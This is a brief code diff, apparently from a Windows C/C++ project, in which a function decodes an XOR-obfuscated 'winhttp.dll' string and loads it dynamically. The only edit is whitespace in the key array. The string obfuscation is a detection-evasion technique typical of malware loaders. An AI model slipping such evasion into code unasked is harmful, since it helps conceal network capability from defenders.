@@ -289,7 +289,7 @@ static bool initWinHTTPEnv()
             't'^0xAC, 't'^0x1F, 'p'^0x49, '.'^0xC6, 
             'd'^0xAC, 'l'^0x1F, 'l'^0x49, 000^0xC6,
         };
-        byte key[] = {0xAC, 0x1F, 0x49, 0xC6};
+        byte key[] = { 0xAC, 0x1F, 0x49, 0xC6 };
         XORBuf(dllName, sizeof(dllName), key, sizeof(key));
         // load winhttp.dll
         HMODULE hModule = module->LoadLibraryA(dllName);
